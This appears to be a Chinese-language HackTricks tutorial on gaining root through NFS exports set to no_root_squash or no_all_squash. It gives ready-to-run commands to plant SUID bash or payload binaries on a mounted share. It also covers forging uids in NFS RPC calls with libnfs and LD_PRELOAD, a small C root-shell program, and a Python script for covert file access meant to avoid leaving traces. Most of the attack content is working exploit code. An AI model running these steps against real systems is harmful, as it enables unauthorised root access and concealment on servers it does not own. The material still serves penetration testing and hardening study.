<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


读取 _ **/etc/exports** _ 文件，如果找到某个目录配置为 **no\_root\_squash**，那么您可以从**客户端**访问该目录，并**在其中写入**文件，就好像您是本地机器的**root**一样。

**no\_root\_squash**：此选项基本上授予客户端上的root用户访问NFS服务器上文件的权限。这可能导致严重的安全问题。

**no\_all\_squash**：这类似于 **no\_root\_squash** 选项，但适用于**非root用户**。想象一下，您以nobody用户的身份获得了shell；检查了 /etc/exports 文件；存在 no\_all\_squash 选项；检查了 /etc/passwd 文件；模拟一个非root用户；以该用户的身份创建一个suid文件（通过使用nfs进行挂载）。以nobody用户身份执行suid文件并成为不同的用户。

# 提权

## 远程利用

如果您发现了此漏洞，您可以利用它：

* 在客户端机器上**挂载该目录**，并**以root身份将** /bin/bash **二进制文件复制到挂载的文件夹中，并赋予其**SUID**权限，然后从受害者**机器上执行**该bash二进制文件。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **在客户端机器上挂载**该目录，并**以root身份复制**我们编译好的恶意载荷到挂载的文件夹中，该载荷将滥用SUID权限，赋予它**SUID**权限，并**从受害者**机器上执行该二进制文件（您可以在这里找到一些[C SUID载荷](payloads-to-execute.md#c)）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## 本地利用

{% hint style="info" %}
请注意，如果您可以从您的计算机创建一个隧道到受害者计算机，您仍然可以使用远程版本来利用这个提权漏洞，隧道所需的端口。\
以下技巧是针对文件 `/etc/exports` **指示一个IP** 的情况。在这种情况下，您将无法在任何情况下使用**远程利用**，您将需要**滥用这个技巧**。\
利用工作的另一个必要条件是**`/etc/export` 中的导出**必须使用`insecure`标志。\
--_我不确定如果 `/etc/export` 指示一个IP地址这个技巧是否会起作用_--
{% endhint %}

## 基本信息

该场景涉及利用本地机器上挂载的NFS共享，利用NFSv3规范中的一个缺陷，允许客户端指定其uid/gid，从而可能实现未经授权的访问。利用涉及使用 [libnfs](https://github.com/sahlberg/libnfs)，这是一个允许伪造NFS RPC调用的库。

### 编译库

根据内核版本的不同，库的编译步骤可能需要进行调整。在这种特定情况下，fallocate系统调用被注释掉了。编译过程涉及以下命令：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 进行利用

该利用涉及创建一个简单的C程序（`pwn.c`），将权限提升至root，然后执行一个shell。该程序被编译，生成的二进制文件（`a.out`）被放置在共享目录中，并使用`ld_nfs.so`来伪造RPC调用中的uid：

1. **编译利用代码：**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **将利用程序放置在共享目录中，并通过伪造uid修改其权限：**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **执行利用程序以获取root权限：**
```bash
/mnt/share/a.out
#root
```

## 附加内容：NFShell 用于隐蔽文件访问
一旦获得root访问权限，为了与NFS共享进行交互而不更改所有权（以避免留下痕迹），使用一个Python脚本（nfsh.py）。该脚本调整uid以匹配所访问文件的uid，允许在共享目录中与文件进行交互而不会出现权限问题：
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
运行如下：
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## 参考
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。 

</details>
